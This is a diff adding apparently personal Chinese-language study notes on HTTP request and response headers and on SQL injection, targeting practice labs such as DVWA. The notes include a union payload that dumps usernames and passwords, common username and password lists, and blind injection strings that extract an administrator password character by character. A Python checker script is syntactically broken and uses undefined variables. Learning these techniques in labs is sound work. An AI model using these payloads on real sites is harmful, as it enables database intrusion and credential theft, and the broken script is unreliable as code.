@@ -1,0 +1,96 @@
+
+一.请求
+1.请求行
+方法：get,post.put.../url/http版本
+2.请求头
+在数据包详情面板中，hypertext transfer protocol然后查看header部分，看host/users-agent/accept/accept-language/accept-encoding/coolie/referer
+3.请求体
+看方法
+二.响应（服务器如何回答）
+1.看状态码200，304，404，500.../状态信息
+2.响应头
+server/content-type/content-length/set-cookie/cache-control/expires/location
+3.服务器返回的实际内容
+eg.html代码，json数据图片
+追踪TCP流以展示完整流程
+# 10.9  
+SQL注入**联合查询**
+1.测列数：前后两次查询的列数必须相同
+用order by来测试，order by 1,order by 2...直到报错
+2.找显示位：需要确定数据会显示在哪个位置
+在确定列数后，用union select 1，2，3看看网页上哪个地方显示了数字，哪个位置就是显示位
+3.正式查询
+知道了列数和显示位，发起攻击，构造payload
+' union select 1,username,password from admin_users --
+常见用户名列表
+admin
+administrator
+root
+test
+pablo
+1337
+guest  
+user
+常见密码列表
+password
+123456
+12345678
+123456789
+1234567890
+000000
+qwerty
+abc123
+letmein
+monkey
+111111
+1234
+admin
+password123
+# 10.11
+**布尔盲注：**
+布尔盲注就是在SQL注入过程中，SQL语句执行后，查询到的数据不能回显到前端页面，如果正确执行了构造的SQL语句，则返回一种页面，如果错误，则执行另一种页面。
+**时间盲注**：
+页面不会返回错误信息，只会回显一种界面，主要利用sleep函数，制造时间延迟，由回显时间来判断是否报错
+   测试单个布尔条件并推断结果
+  `TrackingId=xyz' AND '1'='1`
+   TrackingId=xyz' AND '1'='2
+   验证条件是否为 true，确认存在名为 `users` 的表`TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a``
+   下一步是确定`管理员`用户的密码中有多少个字符
+   `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`
+   `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a`
+   `TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`
+   设置有效负载，发起攻击
+  ######  **10.12**
+  引用python的request库
+get请求
+  import requests
+  #定义请求头
+  headers=user-agent和之后的信息
+  url=https://www.baidu.com/
+  r=requests.get("url.headers=headers")#返回一个response响应对象
+  print(r)/print（r.text)获取网页数据 
+  eg:
+  import requests
+  target_url="http://dvwa.test/vulnerabilities/sqli/"
+  cookies={"PHPSESSID":"pqbv1kljjfqvn5itl4fu5f4t3l","security":"low"}
+  payload1="1'and  '1'='1"
+  payload2="1'and  '1'='2"
+  def check_sql_injection():
+     try:
+     params1={"id":payload,"Submit":"Submit"}
+     response1=requests.get(target_url,params=params1,cookies=cookies)
+     length1=len(response1.text)
+     params2={"id":payload,"Submit":"Submit"}
+     response2=requests.get(target_url,params=params1,cookies=cookies)
+     length2=len(response1.text)
+     if length1 !=length2:
+        print("✅ 存在SQL注入漏洞!响应长度不同表明注入成功。")
+        return True
+        else:
+        print("❌ 未发现SQL注入漏洞。")
+        return False
+       except requests.exceptions.RequestException as e:
+    print(f"请求错误{e}")
+    return False
+    if __name__=="__main__":
+         check_sql_injection()
